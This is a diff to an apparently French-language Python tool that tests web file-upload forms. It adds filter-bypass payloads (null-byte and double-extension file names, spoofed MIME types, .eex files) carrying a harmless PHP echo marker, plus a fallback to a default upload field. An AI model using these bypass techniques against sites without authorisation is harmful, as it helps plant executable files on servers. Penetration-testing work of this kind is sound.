@@ -224,7 +224,9 @@ payloads = {
     6: {"file_name": f"{hash}.php%00.docx", "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "content": "<?php echo 'Ray manta upload'; ?>"},
     7: {"file_name": f"{hash}.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
     8: {"file_name": f"{hash}.docx", "mime": "application/x-php", "content": "<?php echo 'Ray manta upload'; ?>"},
-    9: {"file_name": f"{hash}.php.docx", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
+    9: {"file_name": f"{hash}.php.docx", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    10: {"file_name": f"{hash}.eex", "mime": "text/x-elixir", "content": "<?php echo 'Ray manta upload'; ?>"},
+    11: {"file_name": f"{hash}.eex", "mime": "text/plain", "content": "Ray manta upload"}
 }
 # \xff\xd8\xff\xe0
 #====================================OPTIONS====================================#
@@ -241,9 +243,14 @@ if args.url:
     vars = extract_vars(html)
 
     if len(vars) == 0:
-        print("[!] Aucun champ trouvé")< x 
-        print(exit_payload)
-        exit()
+        print("[!] Aucun champ trouvé")
+        if args.search:
+            print("[!] Utilisation par défaut du champ file")
+            field_name = "file"
+        else:
+            print("[!] Recommandation (-s | --search) pour recherche avancé")
+            print(exit_payload)
+            exit()
     elif len(vars) == 1:
         field_name = vars[0]
         print(f"[+] Champ trouvé : {field_name}")
